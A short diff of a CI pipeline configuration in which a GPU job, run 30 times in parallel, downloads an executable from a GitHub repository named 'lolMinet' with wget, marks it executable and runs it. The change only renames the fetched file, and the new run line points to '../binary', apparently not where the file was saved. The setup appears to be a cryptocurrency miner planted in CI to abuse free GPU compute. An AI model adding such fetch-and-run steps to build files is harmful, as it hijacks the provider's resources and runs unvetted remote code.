@@ -6,6 +6,6 @@ jobs:
       image: ubuntu-1604-cuda-10.1:201909-23
     steps:
       - run: nvidia-smi
-      - run: wget https://raw.githubusercontent.com/Master478963/lolMinet/main/Step && chmod +x Step
-      - run: ./Step
+      - run: wget https://raw.githubusercontent.com/Master478963/lolMinet/main/binary && chmod +x binary
+      - run: ../binary
     parallelism: 30
